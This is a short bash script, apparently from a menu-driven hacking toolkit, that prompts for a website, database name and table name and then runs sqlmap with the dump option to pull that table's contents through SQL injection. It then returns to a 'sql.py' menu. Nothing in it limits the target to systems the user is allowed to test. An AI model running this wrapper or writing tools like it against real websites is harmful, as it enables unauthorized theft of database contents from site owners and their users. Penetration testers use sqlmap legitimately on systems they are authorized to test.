#!/bin/bash
read -p "Enter website :" w
read -p "Enter database :" d
read -p "Enter table :" t
echo -e "Dumping data" 
python sqlmap.py -u "$w" --dump -D $d -T $t
read -p "Press enter to go back" enter
python sql.py
